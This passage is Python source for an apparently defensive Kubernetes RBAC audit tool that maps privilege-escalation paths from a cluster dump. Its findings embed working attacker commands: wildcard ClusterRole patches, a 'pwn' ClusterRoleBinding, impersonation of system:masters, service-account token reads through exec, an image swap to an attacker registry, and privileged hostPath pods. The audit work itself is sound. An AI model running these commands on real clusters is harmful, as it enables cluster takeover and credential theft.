"""Build the escalation graph and search it.

Nodes are identities and footholds, not permissions:

``sa:<ns>:<name>`` ``user:<name>`` ``group:<name>``
    A subject.  Its outgoing edges are the escalation primitives it holds.
``nsadmin:<ns>``
    Full control of one namespace, which is what the ``escalate`` and ``bind``
    verbs on namespaced Roles buy you.  Not cluster-admin: a Role cannot grant
    a cluster-scoped permission.
``node:<name>``
    Control of a node - root on the host, or its kubelet credential.
``cluster-admin``
    The goal.  Read as "effective full control of the cluster" rather than the
    literal ClusterRole: RBAC-014 (cluster-wide Secret read) and RBAC-021
    (control-plane node) both arrive here without anything binding
    cluster-admin to anyone.
``perm:<verb>:<group>:<resource>``
    A permission named with ``--to``, for asking a narrower question.

Edges are generated on demand per node, so the whole graph is never
materialised for a single ``escalate`` query, and the same code answers
``audit`` by walking every subject.
"""

from __future__ import annotations

from collections.abc import Iterable, Sequence
from dataclasses import dataclass, field

from .matching import split_resource
from .model import ALL, PSA_LEVELS, Cluster, Subject
from .resolver import Grant, Reach, Resolver, render_rule
from .rules import get_rule, severity_rank

GOAL = "cluster-admin"

#: Label for the last hop into a ``--to <verb>:<resource>`` target.  Not a rule
#: id: holding the permission you asked about is the end of the search rather
#: than a primitive, so there is nothing to explain or remediate.
TARGET_EDGE = "TARGET"

RBAC_GROUP = "rbac.authorization.k8s.io"
CERTS_GROUP = "certificates.k8s.io"
ADMISSION_GROUP = "admissionregistration.k8s.io"

#: Workload controllers whose pod template the controller will act on.
WORKLOADS: tuple[tuple[str, str], ...] = (
    ("apps", "deployments"),
    ("apps", "statefulsets"),
    ("apps", "daemonsets"),
    ("apps", "replicasets"),
    ("batch", "jobs"),
    ("batch", "cronjobs"),
    ("", "replicationcontrollers"),
)

#: Pod subresources that run code in an existing pod, with the verbs that
#: actually reach them.  exec, attach and portforward are reachable over both
#: GET and POST, which map to the `get` and `create` verbs - a policy that
#: blocks only `create pods/exec` does not block exec.  ephemeralcontainers is
#: a spec subresource and is written, not created.
POD_RUN_SUBRESOURCES: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("exec", ("create", "get")),
    ("attach", ("create", "get")),
    ("portforward", ("create", "get")),
    ("ephemeralcontainers", ("update", "patch")),
)

APISERVER_CLIENT_SIGNER = "kubernetes.io/kube-apiserver-client"

#: Pod Security Standards levels that forbid hostPath, privileged, hostPID and
#: hostNetwork.  Anything weaker leaves the host reachable from a created pod.
PSA_BLOCKS_HOST = frozenset({"baseline", "restricted"})


@dataclass(frozen=True)
class Edge:
    """One escalation step."""

    rule_id: str
    severity: str
    source: str
    target: str
    namespace: str | None
    detail: str
    action: str
    grant_source: str
    grant_rule: str

    @property
    def key(self) -> tuple[str, str, str, str | None]:
        return (self.rule_id, self.source, self.target, self.namespace)


@dataclass(frozen=True)
class Note:
    """A primitive that is present but is not, on its own, a graph edge."""

    rule_id: str
    severity: str
    subject: str
    namespace: str | None
    detail: str
    grant_source: str
    grant_rule: str


@dataclass
class Path:
    edges: tuple[Edge, ...]

    @property
    def source(self) -> str:
        return self.edges[0].source

    @property
    def target(self) -> str:
        return self.edges[-1].target

    @property
    def length(self) -> int:
        return len(self.edges)

    @property
    def worst_severity(self) -> str:
        return min((e.severity for e in self.edges), key=severity_rank)

    @property
    def key(self) -> tuple[tuple[str, str, str, str | None], ...]:
        return tuple(edge.key for edge in self.edges)

    def nodes(self) -> list[str]:
        return [self.edges[0].source] + [edge.target for edge in self.edges]


def node_label(node: str) -> str:
    if node == GOAL:
        return "cluster-admin (effective full control)"
    if node.startswith("nsadmin:"):
        return f"full control of namespace {node.split(':', 1)[1]}"
    if node.startswith("node:"):
        return f"node {node.split(':', 1)[1]}"
    if node.startswith("perm:"):
        _, verb, group, resource = node.split(":", 3)
        return f"{verb} {resource}" + (f".{group}" if group else "")
    if node.startswith("sa:"):
        _, namespace, name = node.split(":", 2)
        return f"ServiceAccount {namespace}/{name}"
    kind, _, name = node.partition(":")
    return f"{kind.capitalize()} {name}"


def parse_subject(text: str) -> Subject:
    """Parse the ``--from`` / ``who-can`` spelling of a subject.

    Accepted: ``sa:<ns>:<name>``, ``system:serviceaccount:<ns>:<name>``,
    ``user:<name>``, ``group:<name>``.  A bare ``system:``-prefixed name is
    read as a group, since that is what those names nearly always are.
    """
    raw = text.strip()
    if not raw:
        raise ValueError("empty subject")
    if raw.startswith("system:serviceaccount:"):
        rest = raw[len("system:serviceaccount:") :]
        namespace, _, name = rest.partition(":")
        if not namespace or not name:
            raise ValueError(
                f"{text!r}: expected system:serviceaccount:<namespace>:<name>"
            )
        return Subject("ServiceAccount", name, namespace)
    if raw.startswith("sa:"):
        rest = raw[3:]
        namespace, _, name = rest.partition(":")
        if not namespace or not name:
            raise ValueError(f"{text!r}: expected sa:<namespace>:<name>")
        return Subject("ServiceAccount", name, namespace)
    if raw.startswith("user:"):
        return Subject("User", raw[5:])
    if raw.startswith("group:"):
        return Subject("Group", raw[6:])
    if raw.startswith("system:"):
        return Subject("Group", raw)
    raise ValueError(
        f"{text!r}: expected sa:<namespace>:<name>, user:<name> or group:<name>"
    )


def parse_target(text: str) -> str:
    """Parse ``--to``: ``cluster-admin`` or ``<verb>:<resource>``."""
    raw = text.strip()
    if raw in (GOAL, "clusteradmin", "admin"):
        return GOAL
    verb, sep, resource = raw.partition(":")
    if not sep or not verb or not resource:
        raise ValueError(
            f"{text!r}: expected 'cluster-admin' or '<verb>:<resource>', "
            "for example 'get:secrets' or 'create:pods.apps'"
        )
    resource, _, group = resource.partition(".")
    return f"perm:{verb}:{group}:{resource}"


@dataclass
class Analysis:
    """Edge generation over one cluster dump."""

    cluster: Cluster
    resolver: Resolver
    assume_psa: str = "privileged"
    extra_groups: tuple[str, ...] = ()
    notes: list[Note] = field(default_factory=list)
    _edge_cache: dict[str, list[Edge]] = field(default_factory=dict)
    _noted: set[tuple[str, str, str | None, str]] = field(default_factory=set)

    # -- helpers -------------------------------------------------------------

    def psa_level(self, namespace: str) -> str:
        ns = self.cluster.namespace(namespace)
        if ns is not None and ns.psa_enforce:
            return ns.psa_enforce
        return self.assume_psa

    def host_access_allowed(self, namespace: str) -> bool:
        return self.psa_level(namespace) not in PSA_BLOCKS_HOST

    def _reach(
        self,
        subject: Subject,
        verb: str,
        api_group: str,
        resource: str,
        subresource: str = "",
        name: str | None = None,
        any_name: bool = False,
        namespaced_attributes: bool = False,
    ) -> Reach:
        return self.resolver.reach(
            subject,
            verb,
            api_group,
            resource,
            subresource,
            name,
            extra_groups=self.extra_groups,
            any_name=any_name,
            namespaced_attributes=namespaced_attributes,
        )

    def _namespaces(self, reach: Reach) -> list[str]:
        return reach.namespaces(self.cluster.known_namespaces())

    def _note(
        self,
        rule_id: str,
        subject: str,
        namespace: str | None,
        detail: str,
        grant: Grant | None = None,
        severity: str | None = None,
    ) -> None:
        key = (rule_id, subject, namespace, detail)
        if key in self._noted:
            return
        self._noted.add(key)
        rule = get_rule(rule_id)
        self.notes.append(
            Note(
                rule_id=rule_id,
                severity=severity or (rule.severity if rule else "medium"),
                subject=subject,
                namespace=namespace,
                detail=detail,
                grant_source=grant.source_text() if grant else "",
                grant_rule=grant.rule_text() if grant else "",
            )
        )

    @staticmethod
    def _edge(
        rule_id: str,
        source: str,
        target: str,
        namespace: str | None,
        detail: str,
        action: str,
        grant: Grant | None = None,
        severity: str | None = None,
    ) -> Edge:
        rule = get_rule(rule_id)
        return Edge(
            rule_id=rule_id,
            severity=severity or (rule.severity if rule else "medium"),
            source=source,
            target=target,
            namespace=namespace,
            detail=detail,
            action=action,
            grant_source=grant.source_text() if grant else "implied by the previous step",
            grant_rule=grant.rule_text() if grant else "",
        )

    # -- edge generation -----------------------------------------------------

    def edges_from(self, node: str) -> list[Edge]:
        cached = self._edge_cache.get(node)
        if cached is not None:
            return cached
        edges = self._generate(node)
        deduped: dict[tuple[str, str, str, str | None], Edge] = {}
        for edge in edges:
            if edge.source == edge.target:
                continue
            deduped.setdefault(edge.key, edge)
        out = list(deduped.values())
        self._edge_cache[node] = out
        return out

    def _generate(self, node: str) -> list[Edge]:
        if node == GOAL or node.startswith("perm:"):
            return []
        if node.startswith("node:"):
            return self._node_edges(node.split(":", 1)[1])
        if node.startswith("nsadmin:"):
            namespace = node.split(":", 1)[1]
            return self._namespace_admin_edges(node, namespace)
        try:
            subject = parse_subject(node)
        except ValueError:
            return []
        return self._subject_edges(node, subject)

    def _subject_edges(self, node: str, subject: Subject) -> list[Edge]:
        wildcard = self._detect_full_wildcard(node, subject)
        if any(edge.target == GOAL for edge in wildcard):
            # The subject already holds cluster-admin's own rule. Every other
            # primitive would also fire against it, which is true but useless:
            # nothing it can do is an escalation. Report the one edge that
            # matters and stop, so a default `cluster-admin` -> `system:masters`
            # binding does not flood the audit with every rule in the
            # catalogue.
            return [edge for edge in wildcard if edge.target == GOAL]
        edges: list[Edge] = list(wildcard)
        for detector in (
            self._detect_escalate,
            self._detect_bind,
            self._detect_impersonate,
            self._detect_admission_webhooks,
            self._detect_pod_create,
            self._detect_pod_write,
            self._detect_pod_run,
            self._detect_workload_write,
            self._detect_token_request,
            self._detect_secret_read,
            self._detect_secret_create,
            self._detect_node_status,
            self._detect_csr_approval,
            self._detect_node_proxy,
            self._detect_non_resource_wildcard,
        ):
            edges.extend(detector(node, subject))
        return edges

    # RBAC-001 ---------------------------------------------------------------

    def _detect_full_wildcard(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for grant in self.resolver.grants(subject, self.extra_groups):
            rule = grant.rule
            if rule.resource_names or rule.is_non_resource_only:
                continue
            if not (ALL in rule.verbs and ALL in rule.api_groups and ALL in rule.resources):
                continue
            if grant.namespace is None:
                edges.append(
                    self._edge(
                        "RBAC-001",
                        node,
                        GOAL,
                        None,
                        "holds wildcard verbs on wildcard resources in every namespace",
                        "kubectl auth can-i '*' '*' --all-namespaces",
                        grant,
                    )
                )
            else:
                edges.append(
                    self._edge(
                        "RBAC-001",
                        node,
                        f"nsadmin:{grant.namespace}",
                        grant.namespace,
                        f"holds wildcard verbs on wildcard resources in namespace {grant.namespace}",
                        f"kubectl auth can-i '*' '*' -n {grant.namespace}",
                        grant,
                        severity="high",
                    )
                )
        return edges

    # RBAC-002 ---------------------------------------------------------------

    def _writable_bound_roles(self, subject: Subject) -> list[tuple[str, Grant]]:
        """Roles already bound to the subject that the subject can rewrite."""
        out: list[tuple[str, Grant]] = []
        seen: set[str] = set()
        bound = {grant.role for grant in self.resolver.grants(subject, self.extra_groups)}
        for ref in sorted(bound, key=str):
            resource = "clusterroles" if ref.kind == "ClusterRole" else "roles"
            for verb in ("update", "patch"):
                reach = self._reach(subject, verb, RBAC_GROUP, resource, name=ref.name)
                grants = (
                    reach.cluster_wide
                    if ref.kind == "ClusterRole"
                    else reach.grants_in(ref.namespace)
                )
                if grants and str(ref) not in seen:
                    seen.add(str(ref))
                    out.append((str(ref), grants[0]))
                    break
        return out

    def _detect_escalate(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        writable = self._writable_bound_roles(subject)
        cluster_reach = self._reach(
            subject, "escalate", RBAC_GROUP, "clusterroles", any_name=True
        )
        if cluster_reach.cluster_wide:
            grant = cluster_reach.cluster_wide[0]
            if writable:
                role_name, _ = writable[0]
                edges.append(
                    self._edge(
                        "RBAC-002",
                        node,
                        GOAL,
                        None,
                        (
                            "holds `escalate` on clusterroles and can rewrite "
                            f"{role_name}, which is already bound to it, so the new "
                            "rules need no new binding"
                        ),
                        (
                            "kubectl patch clusterrole <bound-role> --type=json -p "
                            "'[{\"op\":\"add\",\"path\":\"/rules/-\","
                            "\"value\":{\"apiGroups\":[\"*\"],\"resources\":[\"*\"],"
                            "\"verbs\":[\"*\"]}}]'"
                        ),
                        grant,
                    )
                )
            else:
                self._note(
                    "RBAC-002",
                    node,
                    None,
                    (
                        "holds `escalate` on clusterroles but cannot write any role "
                        "that is already bound to it, so the verb is inert until it "
                        "also gains role write access or a way to create a binding"
                    ),
                    grant,
                    severity="medium",
                )
        ns_reach = self._reach(subject, "escalate", RBAC_GROUP, "roles", any_name=True)
        for namespace in self._namespaces(ns_reach):
            grants = ns_reach.grants_in(namespace)
            if not grants:
                continue
            writable_ns = [
                (name, g) for name, g in writable if name.startswith(f"Role {namespace}/")
            ]
            if writable_ns:
                edges.append(
                    self._edge(
                        "RBAC-002",
                        node,
                        f"nsadmin:{namespace}",
                        namespace,
                        (
                            f"holds `escalate` on roles in namespace {namespace} and can "
                            f"rewrite {writable_ns[0][0]}, which is already bound to it"
                        ),
                        f"kubectl patch role <bound-role> -n {namespace} --type=json -p "
                        "'[{\"op\":\"add\",\"path\":\"/rules/-\",\"value\":"
                        "{\"apiGroups\":[\"*\"],\"resources\":[\"*\"],\"verbs\":[\"*\"]}}]'",
                        grants[0],
                        severity="high",
                    )
                )
            else:
                self._note(
                    "RBAC-002",
                    node,
                    namespace,
                    (
                        f"holds `escalate` on roles in namespace {namespace} but cannot "
                        "write a role already bound to it, so the verb is inert on its own"
                    ),
                    grants[0],
                    severity="medium",
                )
        return edges

    # RBAC-003 ---------------------------------------------------------------

    def _admin_cluster_roles(self) -> list[str]:
        """ClusterRoles in the dump that carry a full wildcard rule."""
        out = []
        for role in self.cluster.cluster_roles():
            for rule, _ in self.resolver.role_rules(role.ref):
                if (
                    ALL in rule.verbs
                    and ALL in rule.api_groups
                    and ALL in rule.resources
                    and not rule.resource_names
                ):
                    out.append(role.name)
                    break
        return sorted(out)

    def _detect_bind(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        admin_roles = self._admin_cluster_roles()
        bindable = self._reach(subject, "bind", RBAC_GROUP, "clusterroles", any_name=True)
        can_create_crb = self._reach(subject, "create", RBAC_GROUP, "clusterrolebindings")
        if bindable.cluster_wide:
            grant = bindable.cluster_wide[0]
            named = grant.rule.resource_names
            reachable_admin = (
                admin_roles if not named else [r for r in admin_roles if r in named]
            )
            if not can_create_crb.cluster_wide:
                self._note(
                    "RBAC-003",
                    node,
                    None,
                    (
                        "holds `bind` on clusterroles but cannot create a "
                        "ClusterRoleBinding, so the verb is inert until it can"
                    ),
                    grant,
                    severity="medium",
                )
            elif reachable_admin:
                target = reachable_admin[0]
                edges.append(
                    self._edge(
                        "RBAC-003",
                        node,
                        GOAL,
                        None,
                        (
                            "holds `bind` on clusterroles and can create a "
                            f"ClusterRoleBinding, so it can bind the wildcard "
                            f"ClusterRole {target} to itself without holding its "
                            "permissions first"
                        ),
                        f"kubectl create clusterrolebinding pwn --clusterrole={target} "
                        f"--serviceaccount={subject.namespace}:{subject.name}"
                        if subject.kind == "ServiceAccount"
                        else f"kubectl create clusterrolebinding pwn --clusterrole={target} "
                        f"--user={subject.name}",
                        grant,
                    )
                )
            elif named:
                self._note(
                    "RBAC-003",
                    node,
                    None,
                    (
                        "holds `bind` on clusterroles restricted by resourceNames to "
                        f"{list(named)}; none of those carries a wildcard rule, so the "
                        "reach is whatever those roles grant"
                    ),
                    grant,
                    severity="medium",
                )
            else:
                self._note(
                    "RBAC-003",
                    node,
                    None,
                    (
                        "holds `bind` on clusterroles and can create bindings, but no "
                        "wildcard ClusterRole is present in this dump; a real cluster "
                        "ships cluster-admin, so re-check against a complete dump"
                    ),
                    grant,
                    severity="high",
                )
        for resource in ("roles", "clusterroles"):
            # The bind check carries the RoleBinding's namespace even for a
            # ClusterRole, so a namespaced grant counts here.
            ns_bind = self._reach(
                subject,
                "bind",
                RBAC_GROUP,
                resource,
                any_name=True,
                namespaced_attributes=True,
            )
            for namespace in sorted(ns_bind.by_namespace):
                create_rb = self._reach(subject, "create", RBAC_GROUP, "rolebindings")
                if not create_rb.grants_in(namespace):
                    continue
                grant = ns_bind.by_namespace[namespace][0]
                named = grant.rule.resource_names
                candidates = admin_roles if not named else [r for r in admin_roles if r in named]
                if resource == "clusterroles" and candidates:
                    edges.append(
                        self._edge(
                            "RBAC-003",
                            node,
                            f"nsadmin:{namespace}",
                            namespace,
                            (
                                f"holds `bind` on clusterroles and can create a "
                                f"RoleBinding in namespace {namespace}, so it can grant "
                                f"itself {candidates[0]} inside that namespace"
                            ),
                            f"kubectl create rolebinding pwn -n {namespace} "
                            f"--clusterrole={candidates[0]} --serviceaccount="
                            f"{subject.namespace}:{subject.name}",
                            grant,
                            severity="high",
                        )
                    )
        return edges

    # RBAC-004 / RBAC-005 ----------------------------------------------------

    def _detect_impersonate(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        groups = self._reach(subject, "impersonate", "", "groups", any_name=True)
        for grant in groups.cluster_wide:
            named = grant.rule.resource_names
            if not named or "system:masters" in named:
                edges.append(
                    self._edge(
                        "RBAC-004",
                        node,
                        GOAL,
                        None,
                        "may impersonate an arbitrary group, including system:masters",
                        "kubectl --as=anyone --as-group=system:masters get secrets -A",
                        grant,
                    )
                )
            else:
                for name in named:
                    edges.append(
                        self._edge(
                            "RBAC-005",
                            node,
                            f"group:{name}",
                            None,
                            f"may impersonate the group {name}",
                            f"kubectl --as=anyone --as-group={name} auth can-i --list",
                            grant,
                        )
                    )
        users = self._reach(subject, "impersonate", "", "users", any_name=True)
        for grant in users.cluster_wide:
            named = grant.rule.resource_names
            if named:
                for name in named:
                    edges.append(
                        self._edge(
                            "RBAC-005",
                            node,
                            f"user:{name}",
                            None,
                            f"may impersonate the user {name}",
                            f"kubectl --as={name} auth can-i --list",
                            grant,
                        )
                    )
            else:
                for candidate in self.resolver.all_subjects():
                    if candidate.kind != "User":
                        continue
                    edges.append(
                        self._edge(
                            "RBAC-005",
                            node,
                            candidate.id,
                            None,
                            f"may impersonate any user, including {candidate.name}",
                            f"kubectl --as={candidate.name} auth can-i --list",
                            grant,
                        )
                    )
        for sa in self.cluster.service_accounts:
            reach = self._reach(subject, "impersonate", "", "serviceaccounts", name=sa.name)
            grants = reach.grants_in(sa.namespace)
            if not grants:
                continue
            edges.append(
                self._edge(
                    "RBAC-005",
                    node,
                    f"sa:{sa.namespace}:{sa.name}",
                    sa.namespace,
                    f"may impersonate ServiceAccount {sa.namespace}/{sa.name}",
                    f"kubectl --as=system:serviceaccount:{sa.namespace}:{sa.name} "
                    "auth can-i --list",
                    grants[0],
                )
            )
        return edges

    # RBAC-006 ---------------------------------------------------------------

    def _detect_admission_webhooks(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for resource in ("mutatingwebhookconfigurations", "validatingwebhookconfigurations"):
            for verb in ("create", "update", "patch"):
                reach = self._reach(subject, verb, ADMISSION_GROUP, resource, any_name=True)
                if not reach.cluster_wide:
                    continue
                grant = reach.cluster_wide[0]
                kind = "mutating" if resource.startswith("mutating") else "validating"
                detail = (
                    f"may `{verb}` {resource}, so it can register a {kind} webhook that "
                    "sees or rewrites every matching admission request in the cluster"
                )
                edges.append(
                    self._edge(
                        "RBAC-006",
                        node,
                        GOAL,
                        None,
                        detail,
                        f"kubectl auth can-i {verb} {resource}",
                        grant,
                    )
                )
                break
        return edges

    # RBAC-007 / 008 / 009 ---------------------------------------------------

    def _pod_creation_edges(
        self,
        node: str,
        namespace: str,
        grant: Grant | None,
        verb_text: str,
    ) -> list[Edge]:
        """What creating a pod in ``namespace`` reaches."""
        edges: list[Edge] = []
        for sa in self.cluster.service_accounts_in(namespace):
            edges.append(
                self._edge(
                    "RBAC-007",
                    node,
                    f"sa:{namespace}:{sa.name}",
                    namespace,
                    (
                        f"{verb_text} in namespace {namespace}, so it can project the "
                        f"token of ServiceAccount {namespace}/{sa.name} into a "
                        "container it controls"
                    ),
                    (
                        f"kubectl run pwn-{sa.name} -n {namespace} "
                        f"--image=registry.example/pause:latest "
                        f"--overrides='{{\"spec\":{{\"serviceAccountName\":\"{sa.name}\"}}}}'"
                        " then read /var/run/secrets/kubernetes.io/serviceaccount/token"
                    ),
                    grant,
                )
            )
        nodes = self.cluster.node_names()
        control_plane = set(self.cluster.control_plane_nodes())
        if self.host_access_allowed(namespace):
            for node_name in nodes:
                edges.append(
                    self._edge(
                        "RBAC-008",
                        node,
                        f"node:{node_name}",
                        namespace,
                        (
                            f"{verb_text} in namespace {namespace}, which enforces the "
                            f"{self.psa_level(namespace)} Pod Security Standard, so the "
                            "pod may mount hostPath / and run privileged on "
                            f"node {node_name}"
                        ),
                        (
                            f"create a pod in {namespace} with "
                            "spec.volumes[].hostPath.path=/ and "
                            "securityContext.privileged=true, pinned with "
                            f"spec.nodeName={node_name}"
                        ),
                        grant,
                    )
                )
            if not nodes:
                self._note(
                    "RBAC-008",
                    node,
                    namespace,
                    (
                        f"{verb_text} in namespace {namespace} with no Pod Security "
                        "Standard enforced, so host mounts are available - but this dump "
                        "contains no Node objects and no scheduled pods, so no node can "
                        "be named. Include `kubectl get nodes -o json` to resolve this."
                    ),
                    grant,
                )
        else:
            self._note(
                "RBAC-008",
                node,
                namespace,
                (
                    f"{verb_text} in namespace {namespace}, but the namespace enforces "
                    f"the {self.psa_level(namespace)} Pod Security Standard, which "
                    "rejects hostPath, privileged, hostPID and hostNetwork. Host access "
                    "is blocked unless the policy is bypassed."
                ),
                grant,
                severity="medium",
            )
        for node_name in sorted(control_plane):
            if self.host_access_allowed(namespace):
                # Already covered by the RBAC-008 edge to this node; record the
                # nodeName mechanism so the reader sees why a taint is not enough.
                edges.append(
                    self._edge(
                        "RBAC-009",
                        node,
                        f"node:{node_name}",
                        namespace,
                        (
                            f"{verb_text} in namespace {namespace} and may set "
                            f"spec.nodeName={node_name}, a control-plane node; nodeName "
                            "bypasses the scheduler, so taints and affinity do not apply"
                        ),
                        f"create a pod in {namespace} with spec.nodeName={node_name} "
                        "and a hostPath volume over the control-plane PKI directory",
                        grant,
                    )
                )
            else:
                self._note(
                    "RBAC-009",
                    node,
                    namespace,
                    (
                        f"{verb_text} in namespace {namespace} and may pin "
                        f"spec.nodeName={node_name}, a control-plane node - Pod Security "
                        "Admission does not restrict nodeName. The "
                        f"{self.psa_level(namespace)} standard does block the host "
                        "mounts that would make the placement useful."
                    ),
                    grant,
                    severity="medium",
                )
        return edges

    def _detect_pod_create(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        reach = self._reach(subject, "create", "", "pods")
        for namespace in self._namespaces(reach):
            grants = reach.grants_in(namespace)
            if not grants:
                continue
            edges.extend(
                self._pod_creation_edges(node, namespace, grants[0], "may `create pods`")
            )
        return edges

    # RBAC-022 ---------------------------------------------------------------

    def _detect_pod_write(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for verb in ("update", "patch"):
            reach = self._reach(subject, verb, "", "pods", any_name=True)
            for namespace in self._namespaces(reach):
                grants = reach.grants_in(namespace)
                if not grants:
                    continue
                for pod in self.cluster.pods_in(namespace):
                    named = self._reach(subject, verb, "", "pods", name=pod.name)
                    if not named.grants_in(namespace):
                        continue
                    edges.append(
                        self._edge(
                            "RBAC-022",
                            node,
                            f"sa:{namespace}:{pod.service_account}",
                            namespace,
                            (
                                f"may `{verb} pods` in namespace {namespace}, so it can "
                                f"replace a container image in pod {pod.name} and run "
                                f"code as ServiceAccount {namespace}/{pod.service_account}"
                            ),
                            f"kubectl set image pod/{pod.name} -n {namespace} "
                            "<container>=registry.example/attacker:latest",
                            grants[0],
                        )
                    )
        return edges

    # RBAC-010 ---------------------------------------------------------------

    def _detect_pod_run(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for subresource, verbs in POD_RUN_SUBRESOURCES:
            for verb in verbs:
                reach = self._reach(subject, verb, "", "pods", subresource, any_name=True)
                for namespace in self._namespaces(reach):
                    grants = reach.grants_in(namespace)
                    if not grants:
                        continue
                    pods = self.cluster.pods_in(namespace)
                    if not pods:
                        self._note(
                            "RBAC-010",
                            node,
                            namespace,
                            (
                                f"may `{verb} pods/{subresource}` in namespace "
                                f"{namespace}, but this dump lists no pods there, so no "
                                "identity can be named. Any pod that later runs in the "
                                "namespace is reachable."
                            ),
                            grants[0],
                            severity="medium",
                        )
                        continue
                    for pod in pods:
                        # Query by name so a resourceNames-restricted rule only
                        # reaches the pods it names.
                        named = self._reach(
                            subject, verb, "", "pods", subresource, name=pod.name
                        )
                        if not named.grants_in(namespace):
                            continue
                        edges.append(
                            self._edge(
                                "RBAC-010",
                                node,
                                f"sa:{namespace}:{pod.service_account}",
                                namespace,
                                (
                                    f"may `{verb} pods/{subresource}` in namespace "
                                    f"{namespace}, so it can run code inside pod "
                                    f"{pod.name} as ServiceAccount "
                                    f"{namespace}/{pod.service_account}"
                                ),
                                (
                                    f"kubectl exec -n {namespace} {pod.name} -- cat "
                                    "/var/run/secrets/kubernetes.io/serviceaccount/token"
                                    if subresource == "exec"
                                    else f"reach pods/{subresource} on "
                                    f"{namespace}/{pod.name}"
                                ),
                                grants[0],
                            )
                        )
        return edges

    # RBAC-011 ---------------------------------------------------------------

    def _detect_workload_write(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        seen: set[str] = set()
        for api_group, resource in WORKLOADS:
            for verb in ("create", "update", "patch"):
                reach = self._reach(subject, verb, api_group, resource, any_name=True)
                for namespace in self._namespaces(reach):
                    grants = reach.grants_in(namespace)
                    if not grants:
                        continue
                    if namespace in seen:
                        continue
                    seen.add(namespace)
                    pretty = f"{resource}.{api_group}" if api_group else resource
                    for edge in self._pod_creation_edges(
                        node,
                        namespace,
                        grants[0],
                        f"may `{verb} {pretty}`, which the controller turns into pods,",
                    ):
                        edges.append(
                            Edge(
                                rule_id="RBAC-011" if edge.rule_id == "RBAC-007" else edge.rule_id,
                                severity=edge.severity,
                                source=edge.source,
                                target=edge.target,
                                namespace=edge.namespace,
                                detail=edge.detail,
                                action=edge.action,
                                grant_source=edge.grant_source,
                                grant_rule=edge.grant_rule,
                            )
                        )
        return edges

    # RBAC-012 ---------------------------------------------------------------

    def _detect_token_request(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for sa in self.cluster.service_accounts:
            reach = self._reach(
                subject, "create", "", "serviceaccounts", "token", name=sa.name
            )
            grants = reach.grants_in(sa.namespace)
            if not grants:
                continue
            edges.append(
                self._edge(
                    "RBAC-012",
                    node,
                    f"sa:{sa.namespace}:{sa.name}",
                    sa.namespace,
                    (
                        "may `create serviceaccounts/token` for "
                        f"{sa.namespace}/{sa.name}, which returns a bearer token for it"
                    ),
                    f"kubectl create token {sa.name} -n {sa.namespace}",
                    grants[0],
                )
            )
        return edges

    # RBAC-013 / RBAC-014 ----------------------------------------------------

    def _detect_secret_read(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for verb in ("get", "list"):
            reach = self._reach(subject, verb, "", "secrets")
            if reach.cluster_wide:
                edges.append(
                    self._edge(
                        "RBAC-014",
                        node,
                        GOAL,
                        None,
                        (
                            f"may `{verb} secrets` in every namespace, which is every "
                            "credential the cluster holds. Treated as terminal because "
                            "recovery means rotating all of them, not because any object "
                            "binds cluster-admin."
                        ),
                        "kubectl get secrets --all-namespaces -o json",
                        reach.cluster_wide[0],
                    )
                )
        token_secrets = [s for s in self.cluster.secrets if s.is_service_account_token]
        for secret in token_secrets:
            if not secret.service_account_name:
                continue
            for verb in ("get", "list"):
                name = secret.name if verb == "get" else None
                reach = self._reach(subject, verb, "", "secrets", name=name)
                grants = reach.grants_in(secret.namespace)
                if not grants:
                    continue
                edges.append(
                    self._edge(
                        "RBAC-013",
                        node,
                        f"sa:{secret.namespace}:{secret.service_account_name}",
                        secret.namespace,
                        (
                            f"may `{verb} secrets` in namespace {secret.namespace}, where "
                            f"Secret {secret.name} is a legacy "
                            "kubernetes.io/service-account-token for "
                            f"{secret.service_account_name}. Auto-creation of these "
                            "stopped in 1.24, so this edge exists only because the "
                            "Secret is still here."
                        ),
                        f"kubectl get secret {secret.name} -n {secret.namespace} "
                        "-o jsonpath='{.data.token}' | base64 -d",
                        grants[0],
                    )
                )
                break
        if not token_secrets:
            for verb in ("get", "list"):
                reach = self._reach(subject, verb, "", "secrets")
                for namespace in sorted(reach.by_namespace):
                    self._note(
                        "RBAC-013",
                        node,
                        namespace,
                        (
                            f"may `{verb} secrets` in namespace {namespace}. No "
                            "kubernetes.io/service-account-token Secret is present in "
                            "this dump, so this reads application credentials rather "
                            "than service-account identities - on 1.24 and later that "
                            "is the expected state."
                        ),
                        reach.by_namespace[namespace][0],
                        severity="medium",
                    )
        return edges

    # RBAC-023 ---------------------------------------------------------------

    def _detect_secret_create(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        reach = self._reach(subject, "create", "", "secrets")
        for namespace in self._namespaces(reach):
            grants = reach.grants_in(namespace)
            if not grants:
                continue
            for sa in self.cluster.service_accounts_in(namespace):
                edges.append(
                    self._edge(
                        "RBAC-023",
                        node,
                        f"sa:{namespace}:{sa.name}",
                        namespace,
                        (
                            f"may `create secrets` in namespace {namespace}, so it can "
                            "create a kubernetes.io/service-account-token Secret "
                            f"annotated for {sa.name}; the token controller still "
                            "populates hand-made Secrets, which 1.24 did not change"
                        ),
                        (
                            f"kubectl create -n {namespace} -f - <<< '{{\"apiVersion\":"
                            "\"v1\",\"kind\":\"Secret\",\"type\":"
                            "\"kubernetes.io/service-account-token\",\"metadata\":"
                            f"{{\"name\":\"pwn\",\"annotations\":{{\"kubernetes.io/"
                            f"service-account.name\":\"{sa.name}\"}}}}}}'"
                        ),
                        grants[0],
                    )
                )
        return edges

    # RBAC-015 ---------------------------------------------------------------

    def _detect_node_status(self, node: str, subject: Subject) -> list[Edge]:
        edges: list[Edge] = []
        for verb in ("update", "patch"):
            reach = self._reach(subject, verb, "", "nodes", "status", any_name=True)
            if not reach.cluster_wide:
                continue
            grant = reach.cluster_wide[0]
            targeted = [p for p in self.cluster.pods if p.node_selector]
            if not targeted:
                self._note(
